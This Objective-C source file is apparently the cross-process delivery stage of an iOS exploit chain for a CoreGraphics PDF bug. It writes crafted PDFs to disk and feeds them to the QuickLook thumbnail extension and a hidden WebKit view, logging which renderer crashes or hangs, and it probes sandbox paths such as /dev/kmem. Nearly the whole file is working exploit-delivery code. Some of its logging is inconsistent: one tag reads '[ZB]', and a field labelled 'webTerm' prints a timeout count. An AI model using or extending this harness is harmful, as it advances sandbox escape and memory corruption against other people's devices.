// jb.m — cross-process delivery harness for CVE-2026-112611.
//
// Why this stage exists: inside our own process the CG bug buys nothing that
// mach_vm_read_overwrite and mach_vm_write do not already give any app for its
// own writable pages. The bug's actual weight is that it fires in whichever
// process parses the PDF, and the processes that parse PDFs for us are not
// sandboxed the way we are. So the escalation is delivery, not memory: hand the
// same geometry to every out-of-process renderer a sandboxed app can reach and
// find out which of them takes the store.
//
// Three consumers, cheapest first:
//
//   JB-1  in-process baseline      CGPDFDocument, same geometry as cg.m.
//   JB-2  QuickLook thumbnail      com.apple.quicklook.thumbnail extension,
//                                  separate process, separate sandbox.
//   JB-3  WebKit PDF plugin        WebContent process, file:// URL.
//
// Everything is logged through the same callback cg.m uses. The interesting
// output is not "it crashed" — it is which consumer returned success, which
// returned a generation error, and which timed out. A timeout plus a
// CoreGraphics entry in Settings > Privacy > Analytics is the cross-process
// proof; a success means that renderer did not take the store and the geometry
// needs to move.
//
// The in-process engine from the reference chain (corrupt CFData _length, then
// repoint _bytes) is deliberately absent here. It cannot write a page the MMU
// refuses, so it is not a step toward anything this build is probing for.

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <QuickLookThumbnailing/QuickLookThumbnailing.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>

extern uint8_t *cg_pdf_build(const char *name, size_t *out_len);

static void (*g_jb_log)(const char *) = NULL;

static void jb_logf(const char *fmt, ...) {
    if (!g_jb_log) return;
    char buf[1600];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    g_jb_log(buf);
}

// ============================================================================
// State
// ============================================================================

static NSString *g_jb_dir = nil;
static NSArray<NSString *> *g_jb_paths = nil;

static volatile int g_jb_ql_calls = 0;
static volatile int g_jb_ql_ok = 0;
static volatile int g_jb_ql_fail = 0;
static volatile int g_jb_ql_timeout = 0;
static volatile int g_jb_wk_ok = 0;
static volatile int g_jb_wk_fail = 0;
static volatile int g_jb_wk_timeout = 0;

static NSString *jb_strerror_io(int e) {
    return [NSString stringWithUTF8String:strerror(e)];
}

// ============================================================================
// JB-0: stage the files
// ============================================================================

#define JB_VARIANTS 3

static int jb_stage_files(void) {
    static const char *names[JB_VARIANTS] = { "A_poc", "G_1024", "H_r128" };

    NSString *tmp = NSTemporaryDirectory();
    if (!tmp) tmp = @"/tmp";
    g_jb_dir = [tmp stringByAppendingPathComponent:@"jb112611"];
    [[NSFileManager defaultManager] createDirectoryAtPath:g_jb_dir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];

    NSMutableArray<NSString *> *made = [NSMutableArray arrayWithCapacity:JB_VARIANTS];
    for (int i = 0; i < JB_VARIANTS; i++) {
        size_t len = 0;
        uint8_t *pdf = cg_pdf_build(names[i], &len);
        if (!pdf || len == 0) {
            jb_logf("[JB] %s build FAILED", names[i]);
            continue;
        }
        NSString *path = [g_jb_dir stringByAppendingPathComponent:
                          [NSString stringWithFormat:@"jb_%s.pdf", names[i]]];
        NSData *blob = [NSData dataWithBytesNoCopy:pdf length:len freeWhenDone:YES];
        NSError *err = nil;
        if (![blob writeToFile:path options:NSDataWritingAtomic error:&err]) {
            jb_logf("[JB] %s write FAILED: %s", names[i],
                    err ? err.localizedDescription.UTF8String : "unknown");
            continue;
        }
        jb_logf("[JB] %s staged %zu bytes -> %s", names[i], len, path.UTF8String);
        [made addObject:path];
    }
    g_jb_paths = [made copy];
    return (int)g_jb_paths.count;
}

// ============================================================================
// JB-1: in-process baseline through the same builder
// ============================================================================

static void jb_baseline(void) {
    if (g_jb_paths.count == 0) return;
    NSString *path = g_jb_paths.firstObject;
    CGDataProviderRef prov = CGDataProviderCreateWithFilename(path.UTF8String);
    if (!prov) { jb_logf("[JB] baseline: provider NULL"); return; }
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithProvider(prov);
    CGDataProviderRelease(prov);
    if (!doc) { jb_logf("[JB] baseline: document NULL"); return; }
    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    jb_logf("[JB] baseline page=%s pages=%zu", page ? "yes" : "no",
            (size_t)CGPDFDocumentGetNumberOfPages(doc));
    CGPDFDocumentRelease(doc);
}

// ============================================================================
// JB-2: QuickLook thumbnail extension
// ============================================================================

static void jb_stage_quicklook(void) {
    if (g_jb_paths.count == 0) return;
    QLThumbnailGenerator *gen = [QLThumbnailGenerator sharedGenerator];
    if (!gen) { jb_logf("[JB] QL: no shared generator"); return; }

    for (NSString *path in g_jb_paths) {
        NSURL *url = [NSURL fileURLWithPath:path];
        QLThumbnailGenerationRequest *req =
            [[QLThumbnailGenerationRequest alloc] initWithFileAtURL:url
                                                               size:CGSizeMake(512, 512)
                                                              scale:2.0
                                                representationTypes:
             QLThumbnailGenerationRequestRepresentationTypeAll];
        if (!req) { jb_logf("[JB] QL: request NULL for %s", path.lastPathComponent.UTF8String); continue; }

        NSString *name = path.lastPathComponent;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        g_jb_ql_calls++;
        uint64_t t0 = mach_absolute_time();

        [gen generateBestRepresentationForRequest:req
                                completionHandler:^(QLThumbnailRepresentation *rep, NSError *err) {
            if (err) {
                g_jb_ql_fail++;
                jb_logf("[JB] QL %s err domain=%s code=%ld",
                        name.UTF8String,
                        err.domain ? err.domain.UTF8String : "?",
                        (long)err.code);
            } else {
                g_jb_ql_ok++;
                CGImageRef img = rep ? rep.CGImage : NULL;
                jb_logf("[JB] QL %s ok image=%s %zux%zu",
                        name.UTF8String, img ? "yes" : "no",
                        img ? CGImageGetWidth(img) : (size_t)0,
                        img ? CGImageGetHeight(img) : (size_t)0);
            }
            dispatch_semaphore_signal(sem);
        }];

        // 20 s: a 318 KB shading PDF with 1024 colour operands is slow enough that
        // 8 s could not tell "extension died" from "extension still rendering".
        long waited = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 20ull * NSEC_PER_SEC));
        uint64_t t1 = mach_absolute_time();
        mach_timebase_info_data_t tb;
        mach_timebase_info(&tb);
        uint64_t ms = (t1 - t0) * tb.numer / tb.denom / 1000000ull;
        if (waited != 0) {
            g_jb_ql_timeout++;
            jb_logf("[JB] QL %s TIMEOUT after 20s", name.UTF8String);
        } else {
            jb_logf("[JB] QL %s took %llums", name.UTF8String, (unsigned long long)ms);
        }
    }
}

// ============================================================================
// JB-3: WebKit PDF plugin in the WebContent process
// ============================================================================

@interface JBNav : NSObject <WKNavigationDelegate>
@property (nonatomic, strong) dispatch_semaphore_t sem;
@property (nonatomic, assign) int outcome;   // 0 pending, 1 finished, -1 failed
@end

@implementation JBNav
- (void)webView:(WKWebView *)wv didFinishNavigation:(WKNavigation *)nav {
    self.outcome = 1;
    dispatch_semaphore_signal(self.sem);
}
- (void)webView:(WKWebView *)wv didFailNavigation:(WKNavigation *)nav withError:(NSError *)err {
    self.outcome = -1;
    dispatch_semaphore_signal(self.sem);
}
- (void)webView:(WKWebView *)wv didFailProvisionalNavigation:(WKNavigation *)nav withError:(NSError *)err {
    self.outcome = -1;
    dispatch_semaphore_signal(self.sem);
}
- (void)webViewWebContentProcessDidTerminate:(WKWebView *)wv {
    // The interesting one: the content process died while loading our file.
    self.outcome = -2;
    dispatch_semaphore_signal(self.sem);
}
@end

// Main thread only. The app may or may not declare a scene manifest, so the
// scene path is tried first and the legacy window list is the fallback.
static UIWindow *jb_key_window_main(void) {
    for (UIScene *sc in UIApplication.sharedApplication.connectedScenes) {
        if (![sc isKindOfClass:[UIWindowScene class]]) continue;
        for (UIWindow *cand in ((UIWindowScene *)sc).windows) {
            if (cand.isKeyWindow) return cand;
        }
    }
    for (UIScene *sc in UIApplication.sharedApplication.connectedScenes) {
        if (![sc isKindOfClass:[UIWindowScene class]]) continue;
        UIWindow *cand = ((UIWindowScene *)sc).windows.firstObject;
        if (cand) return cand;
    }
    // Legacy fallback for bundles without a scene manifest. Deprecated on iOS 13+,
    // but it is the only path left when connectedScenes is empty.
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    UIWindow *legacy = UIApplication.sharedApplication.keyWindow;
    if (legacy) return legacy;
    return UIApplication.sharedApplication.windows.firstObject;
#pragma clang diagnostic pop
}

static UIWindow *jb_key_window(void) {
    if ([NSThread isMainThread]) return jb_key_window_main();
    __block UIWindow *w = nil;
    dispatch_sync(dispatch_get_main_queue(), ^{ w = jb_key_window_main(); });
    return w;
}

static void jb_stage_webkit(void) {
    if (g_jb_paths.count == 0) return;
    UIWindow *win = jb_key_window();
    if (!win) { jb_logf("[JB] WK: no key window, stage skipped"); return; }

    for (NSString *path in g_jb_paths) {
        NSString *name = path.lastPathComponent;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        __block JBNav *nav = nil;
        __block WKWebView *wv = nil;

        dispatch_async(dispatch_get_main_queue(), ^{
            nav = [JBNav new];
            nav.sem = sem;
            wv = [[WKWebView alloc] initWithFrame:CGRectMake(0, 0, 320, 480)];
            wv.navigationDelegate = nav;
            wv.hidden = YES;
            [win addSubview:wv];
            NSURL *dir = [NSURL fileURLWithPath:g_jb_dir isDirectory:YES];
            [wv loadFileURL:[NSURL fileURLWithPath:path] allowingReadAccessToURL:dir];
        });

        long waited = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10ull * NSEC_PER_SEC));
        int outcome = nav ? nav.outcome : 0;

        dispatch_async(dispatch_get_main_queue(), ^{
            [wv removeFromSuperview];
            wv.navigationDelegate = nil;
        });

        if (waited != 0) {
            g_jb_wk_timeout++;
            jb_logf("[JB] WK %s TIMEOUT after 10s", name.UTF8String);
        } else if (outcome == 1) {
            g_jb_wk_ok++;
            jb_logf("[JB] WK %s loaded", name.UTF8String);
        } else if (outcome == -2) {
            g_jb_wk_fail++;
            jb_logf("[JB] WK %s CONTENT PROCESS TERMINATED", name.UTF8String);
        } else {
            g_jb_wk_fail++;
            jb_logf("[JB] WK %s failed to load (outcome=%d)", name.UTF8String, outcome);
        }
    }
}

// ============================================================================
// JB-4: what the sandbox already lets us touch
// ============================================================================

static void jb_sandbox_baseline(void) {
    static const char *probe[] = {
        "/private/var/mobile/Library/Preferences",
        "/private/var/mobile/Media",
        "/private/var/containers/Bundle/Application",
        "/System/Library/CoreServices/SystemVersion.plist",
        "/dev/kmem",
    };
    for (size_t i = 0; i < sizeof(probe) / sizeof(probe[0]); i++) {
        struct stat st;
        errno = 0;
        int rc = stat(probe[i], &st);
        int e = errno;
        jb_logf("[JB] fs %s rc=%d errno=%d (%s)", probe[i], rc, rc ? e : 0,
                rc ? jb_strerror_io(e).UTF8String : "readable");
    }
}

// ============================================================================
// Entry
// ============================================================================

void jb_section(void (*logcb)(const char *));

void jb_section(void (*logcb)(const char *)) {
    g_jb_log = logcb;
    jb_logf("[JB] === cross-process delivery for CVE-2026-112611 ===");

    jb_sandbox_baseline();

    int staged = jb_stage_files();
    jb_logf("[JB] staged=%d", staged);
    if (staged == 0) {
        jb_logf("[JB] nothing to deliver — builder produced no file");
        jb_logf("[JB] === delivery done ===");
        return;
    }

    jb_baseline();

    jb_logf("[JB] --- QuickLook thumbnail extension ---");
    jb_stage_quicklook();
    jb_logf("[JB] QL calls=%d ok=%d fail=%d timeout=%d",
            g_jb_ql_calls, g_jb_ql_ok, g_jb_ql_fail, g_jb_ql_timeout);

    jb_logf("[JB] --- WebKit content process ---");
    jb_stage_webkit();
    jb_logf("[JB] WK ok=%d fail=%d timeout=%d", g_jb_wk_ok, g_jb_wk_fail, g_jb_wk_timeout);

    // Verdict: a consumer that returns success did not take the store, so the
    // geometry has to move for that renderer. A timeout or a terminated content
    // process is the signal we are hunting, and it lands in the analytics log
    // under the daemon's name, not ours.
    int took = g_jb_ql_timeout + g_jb_wk_timeout + g_jb_wk_fail;
    jb_logf("[ZB] verdict=%s qlTimeouts=%d webTerm=%d",
            took > 0 ? "CONSUMER_DIED_OR_HUNG" : "ALL_CONSUMERS_SURVIVED",
            g_jb_ql_timeout, g_jb_wk_timeout);

    jb_logf("[JB] look in Settings > Privacy & Security > Analytics Data for");
    jb_logf("[JB]   CoreGraphics / QuickLook / WebContent entries stamped now.");
    jb_logf("[JB] === delivery done ===");
}
